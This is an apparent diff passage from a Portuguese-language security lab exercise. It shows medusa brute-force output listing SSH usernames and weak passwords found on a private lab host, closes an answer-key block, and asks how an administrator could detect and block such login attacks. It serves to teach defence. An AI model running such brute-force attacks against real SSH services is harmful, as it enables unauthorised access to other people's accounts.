+ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marcelo Password: 123456 [SUCCESS]
+ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marco Password: abacate [SUCCESS]
+....
+endif::gabarito[]
+
+5. De volta à máquina _FWGW1-A_, observe o grande número de tentativas de login sem sucesso que o `medusa` realizou até que tivesse sucesso com os usuários/senhas corretos. Como o administrador de sistemas poderia detectar esse tipo de ataque e bloqueá-lo?
